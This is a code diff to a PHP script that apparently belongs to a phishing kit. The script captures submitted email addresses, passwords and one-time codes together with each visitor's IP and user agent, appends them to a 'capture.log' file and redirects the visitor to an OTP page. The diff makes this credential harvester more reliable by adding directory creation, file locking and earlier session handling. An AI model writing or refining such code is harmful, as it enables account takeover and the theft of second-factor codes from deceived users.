@@ -1,15 +1,30 @@
 <?php
+// Start session early so headers and session are available
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
+
 // Capture step 1 data
-if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['step1'])) {
-    $email = $_POST['email'] ?? 'N/A';
+if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST['step1'])) {
+    $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL) ?: 'N/A';
     $password = $_POST['password'] ?? 'N/A';
     $code = $_POST['code'] ?? 'N/A';
 
-    $log = date('Y-m-d H:i:s') . " | STEP1 | Email: $email | Pass: $password | Code: $code | IP: " . $_SERVER['REMOTE_ADDR'] . " | UA: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
-    file_put_contents('logs/capture.log', $log, FILE_APPEND);
+    // Ensure logs directory exists
+    $logDir = __DIR__ . '/logs';
+    if (!is_dir($logDir)) {
+        mkdir($logDir, 0755, true);
+    }
+
+    $logFile = $logDir . '/capture.log';
+    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
+    $log = date('Y-m-d H:i:s') . " | STEP1 | Email: $email | Pass: $password | Code: $code | IP: $ip | UA: $ua\n";
+
+    // Append log
+    file_put_contents($logFile, $log, FILE_APPEND | LOCK_EX);
 
     // Store email temporarily in session for OTP step
-    session_start();
     $_SESSION['email'] = $email;
 
     header("Location: otp.php");
